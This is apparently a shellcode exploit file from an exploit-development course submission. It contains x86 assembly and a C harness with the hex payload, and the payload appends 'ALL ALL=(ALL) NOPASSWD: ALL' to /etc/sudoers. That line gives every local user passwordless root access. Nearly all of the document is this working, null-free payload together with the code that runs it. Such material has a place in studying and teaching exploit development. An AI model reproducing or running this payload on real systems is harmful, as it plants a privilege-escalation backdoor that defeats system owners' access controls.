/*

Title: Edit /etc/sudoers with NOPASSWD for ALL
Date: 2018-04-19
Author: absolomb
Website: https://www.sploitspren.com
SLAE-ID: 1208
Purpose: edit /etc/sudoers with ALL ALL=(ALL) NOPASSWD: ALL
Tested On: Ubuntu 14.04
Arch: x86
Size: 79 bytes

Shellcode is register independent and null free.

global _start

section .text

_start:

	xor edx, edx		; clear edx
	xor ecx, ecx		; clear ecx
	push edx		; terminating NULL
	push 0x7372656f 	; "sreo"
	push 0x6475732f		; "dus/"
	push 0x6374652f		; "cte/"
	mov ebx, esp		; point ebx to stack
	inc ecx			; ecx to 1
	mov ch, 0x4		; ecx to 401 O_WRONLY | O_APPEND
	push 0x5		; open()
	pop eax
	int 0x80		; execute open
	xchg ebx, eax		; save fd in ebx

	jmp short setup

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);


write:
	pop ecx			; pop "ALL ALL=(ALL) NOPASSWD: ALL"
	mov dl, 0x1c		; len 28
	push 0x4		; write()
	pop eax
	int 0x80		; execute write

	push 0x1		; exit ()
	pop eax
	int 0x80

setup:
	call write
	db "ALL ALL=(ALL) NOPASSWD: ALL" , 0xa

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xd2\x31\xc9\x52\x68\x6f\x65\x72\x73\x68\x2f\x73\x75\x64\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\x6a\x05\x58\xcd\x80\x93\xeb\x0d\x59\xb2\x1c\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xee\xff\xff\xff\x41\x4c\x4c\x20\x41\x4c\x4c\x3d\x28\x41\x4c\x4c\x29\x20\x4e\x4f\x50\x41\x53\x53\x57\x44\x3a\x20\x41\x4c\x4c\x0a";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}